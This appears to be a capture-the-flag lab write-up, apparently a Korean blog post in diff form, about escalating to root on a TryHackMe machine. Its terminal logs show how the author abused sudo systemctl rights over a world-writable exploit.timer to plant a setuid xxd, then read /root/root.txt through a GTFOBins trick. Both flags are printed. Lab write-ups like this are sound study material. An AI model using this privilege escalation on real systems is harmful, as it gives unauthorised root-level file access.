@@ -565,3 +565,456 @@ Last login: Thu Apr 4 17:26:03 2024 from 192.168.0.112
 comte@ip-10-201-71-110:~$
 
 # ip: 10.201.71.110
+
+![](https://velog.velcdn.com/images/agnusdei1207/post/564fb8be-253f-49bf-9b64-cd07580a7500/image.png)
+
+Last login: Thu Apr 4 17:26:03 2024 from 192.168.0.112
+comte@ip-10-201-71-110:~$ ls
+snap user.txt
+comte@ip-10-201-71-110:~$ cat user.txt
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠉⠛⠻⢶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⠁⣠⣴⣶⣶⣤⡀⠈⠉⠛⠿⢶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⠃⠀⢰⣿⠁⠀⠀⢹⡷⠀⠀⠀⠀⠀⠈⠙⠻⠷⣶⣤⣀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠋⠀⠀⠀⠈⠻⠷⠶⠾⠟⠁⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠉⠛⠻⢶⣦⣄⡀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⣼⠟⠛⢿⡆⠀⠀⠀⠀⠀⣀⣤⣶⡿⠟⢿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠋⠀⠀⣴⡿⠛⠛⠛⠛⣿⡄⠀⠀⠀⠀⠻⣶⣶⣾⠇⢀⣀⣤⣶⠿⠛⠉⠀⠀⠀⢸⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⢿⣦⡀⠀⠀⠀⣹⡇⠀⠀⠀⠀⠀⣀⣤⣶⡾⠟⠋⠁⠀⠀⠀⠀⠀⣠⣴⠾⠇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠙⠻⠿⠶⠾⠟⠁⢀⣀⣤⡶⠿⠛⠉⠀⣠⣶⠿⠟⠿⣶⡄⠀⠀⣿⡇⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠟⢁⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠾⠟⠋⠁⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⣼⡇⠀⠀⠙⢷⣤⡀
+⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⣾⡏⢻⣷⠀⠀⠀⢀⣠⣴⡶⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⣤⣤⣴⡟⠀⠀⠀⠀⠀⢻⡇
+⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⠀⠀⠙⠛⢛⣋⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⢸⡇
+⠀⠀⠀⠀⣠⣾⠟⠁⠀⢀⣀⣤⣤⡶⠾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣤⣤⡀⠀⠀⠀⠀⠀⢸⡇
+⠀⠀⣠⣾⣿⣥⣶⠾⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⠶⣶⣤⣀⠀⠀⠀⠀⠀⢠⡿⠋⠁⠀⠀⠀⠈⠉⢻⣆⠀⠀⠀⠀⢸⡇
+⠀⢸⣿⠛⠉⠁⠀⢀⣠⣴⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠋⠀⠀⠀⠉⠻⣷⡀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⢸⡇
+⠀⢸⣿⠀⠀⠀⣴⡟⠋⠀⠀⠈⢻⣦⠀⠀⠀⠀⠀⢰⣿⠁⠀⠀⠀⠀⠀⠀⢸⣷⠀⠀⠀⢻⣧⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⡇
+⠀⢸⡇⠀⠀⠀⢿⡆⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⠀⠀⠀⠙⢿⣦⣄⣀⣀⣠⣤⡾⠋⠀⠀⠀⠀⢸⡇
+⠀⢸⡇⠀⠀⠀⠘⣿⣄⣀⣠⣴⡿⠁⠀⠀⠀⠀⠀⠀⢿⣆⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠀⣀⣤⣴⠿⠃
+⠀⠸⣷⡄⠀⠀⠀⠈⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⡶⠟⠋⠉⠀⠀⠀
+⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⢨⣿⠀⠀⠀⠀⠀⠀⣼⡟⠁⠀⠀⠀⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⢻⣇⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⢠⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣤⣤⣤⣴⡿⠃⠀⠀⣀⣤⣶⠾⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⣀⣠⣴⡾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⣿⡇⠀⠀⠀⠀⣀⣤⣴⠾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⢻⣧⣤⣴⠾⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠘⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+
+THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}
+
+comte@ip-10-201-71-110:/$ find / -perm -4000 -type f 2>/dev/null
+/snap/snapd/21184/usr/lib/snapd/snap-confine
+/snap/snapd/20092/usr/lib/snapd/snap-confine
+/snap/core20/2501/usr/bin/chfn
+/snap/core20/2501/usr/bin/chsh
+/snap/core20/2501/usr/bin/gpasswd
+/snap/core20/2501/usr/bin/mount
+/snap/core20/2501/usr/bin/newgrp
+/snap/core20/2501/usr/bin/passwd
+/snap/core20/2501/usr/bin/su
+/snap/core20/2501/usr/bin/sudo
+/snap/core20/2501/usr/bin/umount
+/snap/core20/2501/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2501/usr/lib/openssh/ssh-keysign
+/snap/core20/2182/usr/bin/chfn
+/snap/core20/2182/usr/bin/chsh
+/snap/core20/2182/usr/bin/gpasswd
+/snap/core20/2182/usr/bin/mount
+/snap/core20/2182/usr/bin/newgrp
+/snap/core20/2182/usr/bin/passwd
+/snap/core20/2182/usr/bin/su
+/snap/core20/2182/usr/bin/sudo
+/snap/core20/2182/usr/bin/umount
+/snap/core20/2182/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2182/usr/lib/openssh/ssh-keysign
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/fusermount
+/usr/bin/umount
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/pkexec
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/bin/chfn
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+comte@ip-10-201-71-110:/$
+
+# ssh -i /root/.ssh/id_ed25519 comte@10.201.71.110
+
+comte@ip-10-201-71-110:/$ find /bin /usr/bin /sbin /usr/sbin /usr/local/bin -perm -4000 -type f 2>/dev/null
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/fusermount
+/usr/bin/umount
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/pkexec
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/bin/chfn
+
+# sudo -l
+
+comte@ip-10-201-71-110:/$ sudo -l
+User comte may run the following commands on ip-10-201-71-110:
+(ALL) NOPASSWD: /bin/systemctl daemon-reload
+(ALL) NOPASSWD: /bin/systemctl restart exploit.timer
+(ALL) NOPASSWD: /bin/systemctl start exploit.timer
+(ALL) NOPASSWD: /bin/systemctl enable exploit.timer
+
+omte@ip-10-201-71-110:/$ find / -name exploit.timer 2>/dev/null
+/etc/systemd/system/exploit.timer
+comte@ip-10-201-71-110:/$
+
+comte@ip-10-201-71-110:/etc/systemd/system$ ls -al
+total 132
+drwxr-xr-x 21 root root 4096 May 11 19:44 .
+drwxr-xr-x 5 root root 4096 Apr 26 05:48 ..
+drwxr-xr-x 2 root root 4096 May 11 19:44 cloud-config.target.wants
+drwxr-xr-x 2 root root 4096 Mar 14 2023 cloud-final.service.wants
+drwxr-xr-x 2 root root 4096 May 11 19:44 cloud-init.target.wants
+lrwxrwxrwx 1 root root 40 Mar 14 2023 dbus-org.freedesktop.ModemManager1.service -> /lib/systemd/system/ModemManager.service
+lrwxrwxrwx 1 root root 44 Mar 14 2023 dbus-org.freedesktop.resolve1.service -> /lib/systemd/system/systemd-resolved.service
+lrwxrwxrwx 1 root root 36 Sep 27 2023 dbus-org.freedesktop.thermald.service -> /lib/systemd/system/thermald.service
+lrwxrwxrwx 1 root root 45 Mar 14 2023 dbus-org.freedesktop.timesync1.service -> /lib/systemd/system/systemd-timesyncd.service
+drwxr-xr-x 2 root root 4096 Mar 14 2023 default.target.wants
+drwxr-xr-x 2 root root 4096 Sep 27 2023 emergency.target.wants
+-rw-r--r-- 1 root root 141 Mar 29 2024 exploit.service
+
+# here
+
+-rwxrwxrwx 1 root root 87 Mar 29 2024 exploit.timer
+drwxr-xr-x 2 root root 4096 Mar 14 2023 final.target.wants
+drwxr-xr-x 2 root root 4096 Mar 14 2023 getty.target.wants
+drwxr-xr-x 2 root root 4096 Mar 14 2023 graphical.target.wants
+lrwxrwxrwx 1 root root 38 Mar 14 2023 iscsi.service -> /lib/systemd/system/open-iscsi.service
+drwxr-xr-x 2 root root 4096 Mar 14 2023 mdmonitor.service.wants
+lrwxrwxrwx 1 root root 38 Mar 14 2023 multipath-tools.service -> /lib/systemd/system/multipathd.service
+drwxr-xr-x 2 root root 4096 Apr 26 05:43 multi-user.target.wants
+lrwxrwxrwx 1 root root 35 Sep 27 2023 mysqld.service -> /lib/systemd/system/mariadb.service
+lrwxrwxrwx 1 root root 35 Sep 27 2023 mysql.service -> /lib/systemd/system/mariadb.service
+drwxr-xr-x 2 root root 4096 Mar 14 2023 network-online.target.wants
+drwxr-xr-x 2 root root 4096 Mar 14 2023 open-vm-tools.service.requires
+drwxr-xr-x 2 root root 4096 Mar 14 2023 paths.target.wants
+drwxr-xr-x 2 root root 4096 Sep 27 2023 rescue.target.wants
+drwxr-xr-x 2 root root 4096 Sep 27 2023 sleep.target.wants
+-rw-r--r-- 1 root root 349 Mar 14 2024 snap-core20-2182.mount
+-rw-r--r-- 1 root root 326 Apr 26 05:48 snap-core20-2501.mount
+drwxr-xr-x 2 root root 4096 Apr 26 05:43 snapd.mounts.target.wants
+-rw-r--r-- 1 root root 343 Mar 14 2023 snap-lxd-24061.mount
+-rw-r--r-- 1 root root 320 Apr 26 05:48 snap-lxd-32662.mount
+-rw-r--r-- 1 root root 467 Apr 26 05:43 snap.lxd.activate.service
+-rw-r--r-- 1 root root 541 Apr 26 05:43 snap.lxd.daemon.service
+-rw-r--r-- 1 root root 330 Apr 26 05:43 snap.lxd.daemon.unix.socket
+-rw-r--r-- 1 root root 349 Sep 27 2023 snap-snapd-20092.mount
+-rw-r--r-- 1 root root 326 Apr 26 05:48 snap-snapd-21184.mount
+drwxr-xr-x 2 root root 4096 Apr 26 05:43 sockets.target.wants
+lrwxrwxrwx 1 root root 31 Sep 27 2023 sshd.service -> /lib/systemd/system/ssh.service
+drwxr-xr-x 2 root root 4096 Mar 14 2023 sysinit.target.wants
+lrwxrwxrwx 1 root root 35 Mar 14 2023 syslog.service -> /lib/systemd/system/rsyslog.service
+drwxr-xr-x 2 root root 4096 Mar 29 2024 timers.target.wants
+-rw-r--r-- 1 root root 156 Sep 27 2023 twist.service
+lrwxrwxrwx 1 root root 41 Mar 14 2023 vmtoolsd.service -> /lib/systemd/system/open-vm-tools.service
+comte@ip-10-201-71-110:/etc/systemd/system$
+
+# exploit.timer
+
+comte@ip-10-201-71-110:/etc/systemd/system$ cat exploit.timer
+[Unit]
+Description=Exploit Timer
+
+[Timer]
+OnBootSec=
+
+[Install]
+WantedBy=timers.target
+
+# exploit.service
+
+comte@ip-10-201-71-110:/etc/systemd/system$ cat exploit.service
+[Unit]
+Description=Exploit Service
+
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
+
+---
+
+# systemctl status exploit.timer
+
+comte@ip-10-201-71-110:/opt$ systemctl status exploit.timer
+● exploit.timer - Exploit Timer
+Loaded: bad-setting (Reason: Unit exploit.timer has a bad unit file setting.)
+Active: inactive (dead)
+Trigger: n/a
+Triggers: ● exploit.service
+comte@ip-10-201-71-110:/opt$
+
+# comte@ip-10-201-71-110:/etc/systemd/system$ cat exploit.timer -> 5s setting
+
+[Unit]
+Description=Exploit Timer
+
+[Timer]
+OnBootSec=5s
+
+[Install]
+WantedBy=timers.target
+
+# 아래 명령어 활용해서 재시작
+
+(ALL) NOPASSWD: /bin/systemctl daemon-reload
+(ALL) NOPASSWD: /bin/systemctl restart exploit.timer
+(ALL) NOPASSWD: /bin/systemctl start exploit.timer
+(ALL) NOPASSWD: /bin/systemctl enable exploit.timer
+
+comte@ip-10-201-71-110:/etc/systemd/system$ sudo /bin/systemctl daemon-reload
+comte@ip-10-201-71-110:/etc/systemd/system$ sudo /bin/systemctl restart exploit.timer
+comte@ip-10-201-71-110:/etc/systemd/system$ sudo /bin/systemctl start exploit.timer
+comte@ip-10-201-71-110:/etc/systemd/system$ sudo /bin/systemctl enable exploit.timer
+Created symlink /etc/systemd/system/timers.target.wants/exploit.timer → /etc/systemd/system/exploit.timer.
+comte@ip-10-201-71-110:/etc/systemd/system$
+
+# active
+
+comte@ip-10-201-71-110:/etc/systemd/system$ systemctl status exploit.timer
+● exploit.timer - Exploit Timer
+Loaded: loaded (/etc/systemd/system/exploit.timer; enabled; vendor preset: enabled)
+Active: active (elapsed) since Mon 2025-08-04 14:34:47 UTC; 29s ago
+Trigger: n/a
+Triggers: ● exploit.service
+comte@ip-10-201-71-110:/etc/systemd/system$
+
+# ls -al /opt
+
+comte@ip-10-201-71-110:/etc/systemd/system$ ls -al /opt
+total 28
+drwxr-xr-x 2 root root 4096 Aug 4 14:34 .
+drwxr-xr-x 19 root root 4096 Aug 4 10:35 ..
+-rwsr-sr-x 1 root root 18712 Aug 4 14:34 xxd
+comte@ip-10-201-71-110:/etc/systemd/system$
+
+comte@ip-10-201-71-110:/opt$ strings xxd
+/lib64/ld-linux-x86-64.so.2
+vCRW
+mfUa
+libc.so.6
+getc
+fflush
+exit
+fopen
+strncmp
+perror
+putc
+ftell
+stdin
+rewind
+strtol
+fseek
+stdout
+fputs
+fclose
+strtoul
+**ctype_b_loc
+stderr
+fwrite
+fprintf
+fdopen
+**ctype*toupper_loc
+**strcpy_chk
+**cxa_finalize
+**sprintf_chk
+strcmp
+**libc_start_main
+ferror
+GLIBC_2.3.4
+GLIBC_2.2.5
+GLIBC_2.3
+\_ITM_deregisterTMCloneTable
+**gmon_start**
+\_ITM_registerTMCloneTable
+AVAUI
+ATUSH
+d$4A
+-u      A
+T$4t
+D$4E
+D;d$
+\$(L
+d$ A
+X[]A\A]A^A*
+d$ 1
+l$(H
+d$ 1
+d$ 1
+l$(H
+\$8A
+D$ H
+D$(H
+D$HL
+|$(A
+D$ H
+D;|$
+|$(Hc
+\$ H
+T$8L
+t$(t
+T$DL
+T$DL
+L95C3
+x I9
+L;5g1
+\$8L
+\$8L
+|$8H
+D$HI
+L$8Hc
+t$ 1
+t$ 1
+bu6A
+u+UH
+[]A\A]A^A*
+%s:
+Options:
+(or +: rel.)
+[+][-]
+%s0x%02x
+%s0X%02X
+%s%s
+apitalize
+roup
+ffset
+%s: sorry cannot seek.
+unsigned char %s
+[] = {
+unsigned int %s
+*%s = %d;
+%08lx:
+Usage:
+%s [options] [infile [outfile]]
+or
+%s -r [-s [-]offset] [-c cols] [-ps] [infile [outfile]]
+-a toggle autoskip: A single '_' replaces nul-lines. Default off.
+-b binary digit dump (incompatible with -ps,-i,-r). Default hex.
+-C capitalize variable names in C include file style (-i).
+-c cols format <cols> octets per line. Default 16 (-i: 12, -ps: 30).
+-E show characters in EBCDIC. Default ASCII.
+-e little-endian dump (incompatible with -ps,-i,-r).
+-g number of octets per group in normal output. Default 2 (-e: 4).
+-h print this summary.
+-i output in C include file style.
+-l len stop after <len> octets.
+-o off add <off> to the displayed file position.
+-ps output in postscript plain hexdump style.
+-r reverse operation: convert (or patch) hexdump into binary.
+-r -s off revert with <off> added to file positions found in hexdump.
+-s %sseek start at <seek> bytes abs. %sinfile offset.
+-u use upper case hex letters.
+-v show version: "%s%s".
+%s: invalid number of columns (max. %d).
+%s: number of octets per group must be a power of 2 with -e.
+%s: sorry, cannot revert this type of hexdump
+%s: sorry, cannot seek backwards.
+.<(+|&
+!$_);~-/
+,%\_>?
+`:#@'="
+abcdefghi
+jklmnopqr^
+stuvwxyz
+{ABCDEFGHI
+}JKLMNOPQR
+STUVWXYZ
+0123456789
+:\*3$"
+0123456789abcdef0123456789ABCDEF
+xxd V1.10 27oct98 by Juergen Weigert
+f90ef6c8f61f76435257ef685569bb2b0bb3be.debug
+.shstrtab
+.interp
+.note.gnu.property
+.note.gnu.build-id
+.note.ABI-tag
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.plt.sec
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.data
+.bss
+.gnu_debuglink
+comte@ip-10-201-71-110:/opt$
+
+# built file ? -> GTFObins 'XXD' search
+
+comte@ip-10-201-71-110:/opt$ file xxd
+xxd: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c2f90ef6c8f61f76435257ef685569bb2b0bb3be, for GNU/Linux 3.2.0, stripped
+comte@ip-10-201-71-110:/opt$
+
+https://gtfobins.github.io/gtfobins/xxd/
+![](https://velog.velcdn.com/images/agnusdei1207/post/e0509d9b-6e95-4d1e-99f7-f5d10672e7d8/image.png)
+
+# GTFObins
+
+LFILE=/opt/xxd
+xxd "$LFILE" | xxd -r
+
+ot revert this type of hexdump
+%s: sorry, cannot seek backwards.
+
+����������.<(+|&���������!$*);~-/���������,%_>?���������`:#@'="�abcdefghi�������jklmnopqr^�������stuvwxyz���[���������������]��{ABCDEFGHI������}JKLMNOPQR������\�STUVWXYZ������0123456789������\
+��������� ��������`P���x@����p������������`����zRx
+                                                 ����/D$4�����FJ
+                                                                �?:*3$"\P���tH�����P���-A��h���^AM@�����A�D�D |
+AI
+B
+AD
+v
+AH
+L8����F�E�B �E(�A0�A8�D�
+A0A(B BBA
+DT8���eF�I�E �E(�D0�H8�G@n8A0A(B BB�`����(�(
+���o���
+b
+ O@�    �      ������o���o���o���oM0@P`p�������� 0@P`p��P0123456789abcdef0123456789ABCDEFxxd V1.10 27oct98 by Juergen Weigert Pf90ef6c8f61f76435257ef685569bb2b0bb3be.debug�e�.shstrtab.interp.note.gnu.property.note.gnu.build-id.note.ABI-tag.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.plt.sec.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.dynamic.data.bss.gnu_debuglink
+8&XX$9|| G���o��Q
+�00� ��7�7\��M=��P@� �P�@� �@4�@comte@ip-10-201-71-110:/opt$
+\
+
+# text are broken...
+
+LFILE=/root/root.txt
+/opt/xxd "$LFILE" | xxd -r
+
+comte@ip-10-201-71-110:~$ /opt/xxd "$LFILE" | xxd -r
+\_ \_ \_ \_ **
+\_**| |** \_** **\_ \_** **_ (_)\_** | (_)/ _| **\_
+/ **| '_ \ / _ \/ _ \/ \_\_|/ _ \ | / **| | | | |_ / _ \
+| (**| | | | **/ **/\_\_ \ **/ | \__ \ | | | _| **/
+\_**|_| |_|\_**|\_**||\_**/\_**| |_|_**/ |_|_|\_| \_\_\_|
+
+THM{dca75486094810807faf4b7b0a929b11e5e0167c}
